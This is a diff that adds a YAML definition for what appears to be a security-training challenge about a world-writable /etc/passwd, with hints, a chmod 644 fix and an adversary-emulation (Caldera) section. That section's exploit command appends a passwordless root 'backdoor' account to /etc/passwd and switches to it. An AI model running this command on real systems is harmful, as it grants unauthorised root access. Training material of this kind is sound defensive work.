@@ -1,0 +1,35 @@
+id: writable_passwd
+name: World-Writable /etc/passwd
+description: The /etc/passwd file has world-write permissions (666), allowing any local user to add new root-level accounts or modify existing accounts without requiring sudo or root access.
+type: vulnerability
+difficulty: hard
+points: 300
+category: filesystem
+tags: [permissions, privilege-escalation, filesystem, passwd]
+conflicts: []
+requires: []
+script: writable_passwd.sh
+verification:
+  type: file_permissions
+  path: /etc/passwd
+  expected: "644"
+suggested_fix: "Restore correct permissions on /etc/passwd: chmod 644 /etc/passwd"
+hints:
+  - "Check permissions on critical system authentication files"
+  - "Look at the permissions on /etc/passwd — it should not be writable by everyone"
+  - "Restore the correct permissions: chmod 644 /etc/passwd"
+caldera:
+  tactic: persistence
+  technique:
+    attack_id: T1136.001
+    name: "Create Account: Local Account"
+  recon:
+    description: "Check if /etc/passwd is world-writable"
+    command: |
+      [ -w /etc/passwd ] && stat -c "%a" /etc/passwd | grep -q "6$" && echo "VULNERABLE: /etc/passwd is world-writable" || echo "SECURE: /etc/passwd is not world-writable"
+  exploit:
+    description: "Add a backdoor root account by writing directly to /etc/passwd"
+    command: |
+      echo 'backdoor::0:0::/root:/bin/bash' >> /etc/passwd
+      echo "Backdoor root account 'backdoor' added (no password)"
+      su -s /bin/bash backdoor -c "id"
